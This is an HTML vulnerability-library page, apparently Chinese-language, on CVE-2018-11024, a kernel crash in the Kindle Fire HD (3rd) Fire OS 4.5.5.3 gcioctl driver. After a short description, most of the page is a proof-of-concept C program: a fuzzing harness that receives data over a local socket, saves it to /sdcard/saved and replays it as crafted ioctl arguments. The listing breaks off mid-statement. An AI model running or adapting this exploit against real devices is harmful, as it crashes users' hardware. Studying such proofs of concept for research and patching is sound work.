<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X73497fea6957a929c20f7f812437058a503f4b6"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-11024</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Amazon Kindle Fire HD (3rd) Fire OS kernel</span><span class="csECDA2D3">组件安全漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Amazon Kindle Fire HD</span><span class="cs9C1B1871">（</span><span class="cs8926E06">3rd</span><span class="cs9C1B1871">）</span><span class="cs8926E06">Fire OS 4.5.5.3</span><span class="cs9C1B1871">的内核组件中的内核模块</span><span class="cs8926E06">/omap/drivers/misc/gcx/gcioctl/gcif.c</span><span class="cs9C1B1871">允许攻击者通过设备</span><span class="cs8926E06">/ dev</span><span class="cs9C1B1871">上</span><span class="cs8926E06">ioctl</span><span class="cs9C1B1871">的参数注入特制参数</span><span class="cs8926E06">/ gcioctl</span><span class="cs9C1B1871">使用命令</span><span class="cs8926E06">1077435789</span><span class="cs9C1B1871">并导致内核崩溃。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Fire OS 4.5.5.3</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#include&lt;stdio.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include&lt;string.h&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//strlen</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include&lt;sys/socket.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include&lt;arpa/inet.h&gt; //inet_addr</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include&lt;unistd.h&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//write</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;stdlib.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;sys/stat.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;sys/mman.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;fcntl.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;stdbool.h&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux/</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">int debug = 1;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">typedef struct {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int src_id;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int dst_id;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int offset;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} map_entry_t;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">short tiny_vals[18] = {128, 127, 64, 63, 32, 31, 16, 15, 8, 7, 4, 3, 2, 1, 0, 256, 255, -1};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">int *small_vals;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">int num_small_vals;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// populates small_vals when called</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">void populate_arrs(int top) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int num = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int count = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while (num &lt; top) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;%d\n&quot;, num);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num &lt;&lt;= 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count += 2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// top</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;count += 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// -1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;count += 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;num_small_vals = count;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;num &gt;&gt;= 1;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;small_vals = malloc(sizeof(int)*count);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;memset(small_vals, 0, count);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int i = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(num &gt; 1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;small_vals[i] = num;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i++;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;small_vals[i] = num-1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i++;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num &gt;&gt;= 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;small_vals[i] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;small_vals[i+1] = top;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;small_vals[i+2] = top-1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;small_vals[i+3] = -1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// generate a random value of size size and store it in elem.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// value has a weight % chance to be a &quot;small value&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">void gen_rand_val(int size, char *elem, &nbsp;int small_weight) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int i;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ((rand() % 100) &lt; small_weight) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// do small thing</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned int idx = (rand() % num_small_vals);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Choosing %d\n&quot;, small_vals[idx]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch (size) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 2:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idx = (rand() % 18);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(short *)elem = tiny_vals[idx];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 4:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(int *)elem = small_vals[idx];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 8:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(long long*)elem = small_vals[idx];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Damn bro. Size: %d\n&quot;, size);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(i=0; i &lt; size; i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elem[i] = (char)(rand()%0x100);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">int main(int argc , char *argv[])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int num_blobs = 0, num_mappings = 0, i = 0, dev_name_len = 0, j;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned int ioctl_id = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;char *dev_name;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;void *tmp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;char **ptr_arr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int *len_arr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned int seed;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int sockfd , client_sock , c , read_size;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;struct sockaddr_in server , client;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int msg_size;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;void *generic_arr[264];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// max val for small_vals array</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int top = 8192;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int cnt = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// chance that our generics are filled with &quot;small vals&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int default_weight = 50;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;populate_arrs(top);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int retest = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;goto rerun;</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sockfd = socket(AF_INET , SOCK_STREAM , 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (sockfd == -1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Could not create socket&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;puts(&quot;Socket created&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(int){ 1 }, sizeof(int));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server.sin_family = AF_INET;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server.sin_addr.s_addr = INADDR_ANY;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server.sin_port = htons(atoi(argv[1]));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//Bind</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if( bind(sockfd,(struct sockaddr *)&amp;server , sizeof(server)) &lt; 0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//print the error message</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;bind failed. Error&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;puts(&quot;bind done&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">listen: &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Listen</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;listen(sockfd , 3);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;puts(&quot;Waiting for incoming connections...&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c = sizeof(struct sockaddr_in);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// accept connection from an incoming client</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;client_sock = accept(sockfd, (struct sockaddr *)&amp;client, (socklen_t*)&amp;c);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (client_sock &lt; 0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;accept failed&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;puts(&quot;Connection accepted&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;msg_size = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Receive a message from client</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while( (read_size = recv(client_sock , &amp;msg_size , 4 , 0)) &gt; 0 )</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// recv the entire message</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char *recv_buf = calloc(msg_size, sizeof(char));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (recv_buf == NULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed to allocate recv_buf\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int nrecvd = recv(client_sock, recv_buf, msg_size, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (nrecvd != msg_size) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Error getting all data!\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;nrecvd: %d\nmsg_size:%d\n&quot;, nrecvd, msg_size);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// quickly save a copy of the most recent data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int savefd = open(&quot;/sdcard/saved&quot;, O_WRONLY|O_TRUNC|O_CREAT, 0644);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (savefd &lt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;open saved&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int err = write(savefd, recv_buf, msg_size);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (err != msg_size) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;write saved&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fsync(savefd);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(savefd);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rerun:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (retest) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recv_buf = calloc(msg_size, sizeof(char));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int fd = open(&quot;/sdcard/saved&quot;, O_RDONLY);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (fd &lt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;open:&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int fsize = lseek(fd, 0, SEEK_END);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;file size: %d\n&quot;, fsize);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lseek(fd, 0, SEEK_SET);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read(fd, recv_buf, fsize);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char *head = 